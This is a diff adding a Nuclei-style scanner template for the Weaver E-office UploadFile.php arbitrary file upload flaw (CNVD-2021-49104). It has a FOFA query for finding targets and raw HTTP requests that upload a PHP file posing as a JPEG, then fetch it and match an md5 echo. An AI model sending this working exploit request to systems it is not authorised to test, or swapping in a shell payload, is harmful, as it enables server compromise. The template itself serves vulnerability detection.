@@ -1,0 +1,42 @@
+id: weaver-eoffice-UploadFile-fileupload
+info:
+  name: 泛微 E-office UploadFile.php - fileupload
+  author: leadlife
+  severity: critical
+  description: 泛微OA E-Office UploadFile.php 任意文件上传漏洞 CNVD-2021-49104
+  reference: 
+    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA%20E-Office%20UploadFile.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-2021-49104.md
+  metadata:
+    verified: false
+    fofa-query: app="泛微-EOffice"
+  tags: weaver,eoffice,fileupload,oa,2021
+
+http:
+  - raw:
+      - |
+        POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="{{randstr}}.php"
+        Content-Type: image/jpeg
+
+        <?php echo md5('CNVD-2021-49104');?>
+
+        --e64bdf16c554bbc109cecef6451c26a4--
+
+      - |
+        GET /images/logo/logo-eoffice.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "94d01a2324ce38a2e29a629c54190f67"
+
+      - type: status
+        status:
+          - 200
